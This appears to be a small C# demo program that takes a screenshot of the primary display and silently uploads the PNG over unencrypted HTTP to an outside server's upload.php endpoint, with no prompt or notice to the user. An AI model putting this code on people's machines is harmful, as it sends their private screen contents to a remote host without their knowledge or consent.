using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Drawing;
using System.Windows.Forms;

namespace ScreenPostDemo
{
	public class Program
	{
		private static Bitmap CreateBitmap(bool primaryOnly)
		{
			return primaryOnly ?
				new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
				: new Bitmap(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height);
		}

		private static byte[] TakeSnapShot(bool primaryOnly)
		{
			using (var ms = new MemoryStream())
			using (Bitmap bitmap = CreateBitmap(true))
			using (Graphics canvas = Graphics.FromImage(bitmap))
			{
				canvas.CopyFromScreen(
					Screen.PrimaryScreen.Bounds.X,
					Screen.PrimaryScreen.Bounds.Y,
					0, 0, bitmap.Size,
					CopyPixelOperation.SourceCopy
				);

				bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Png);

				return ms.ToArray();
			}
		}

		static void Main(string[] args)
		{
			//File.WriteAllBytes(@"Z:\.Trash\kk.png", TakeSnapShot(true));

			var body = TakeSnapShot(true);
			var client = new WebClient();

			using (var stream = client.OpenWrite("http://www2.unsec.net/usb/upload.php"))
			{
				stream.Write(body, 0, body.Length);
				stream.Flush();
			}
		}
	}
}
